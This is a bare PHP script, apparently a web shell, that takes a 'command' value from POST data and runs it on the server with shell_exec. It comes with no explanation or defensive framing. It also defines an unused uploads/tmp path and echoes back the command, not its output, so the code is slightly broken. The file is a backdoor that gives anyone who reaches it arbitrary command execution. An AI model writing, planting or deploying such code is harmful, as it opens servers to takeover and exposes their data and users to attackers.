<?php
$tmp = $_SERVER['DOCUMENT_ROOT'].'/uploads/tmp/';
$command = ( !empty($_POST['command']) ) ? $_POST['command'] : false;
if($command) {
    $output = shell_exec($command);
    echo $command;
}